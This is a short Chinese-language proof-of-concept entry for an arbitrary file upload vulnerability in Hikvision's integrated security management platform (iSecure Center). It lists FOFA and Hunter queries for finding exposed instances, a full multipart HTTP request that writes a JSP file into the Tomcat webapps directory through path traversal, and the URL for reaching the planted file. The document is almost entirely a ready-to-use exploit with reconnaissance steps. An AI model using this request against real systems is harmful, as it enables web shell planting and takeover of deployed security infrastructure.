# HiKVISION 综合安防管理平台 report 任意文件上传漏洞

## 网络测绘

fofa: app="HIKVISION-综合安防管理平台"

hunter: app.name="Hikvision 海康威视 iSecure Center"

## POC / EXP

```
POST /svm/api/external/report HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5550.200 Safari/537.36 Edg/112.0.1551.59
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/test.jsp"
Content-Type: application/zip

test

------WebKitFormBoundary9PggsiM755PLa54a--
```

```
/portal/ui/login/..;/..;/test.jsp
```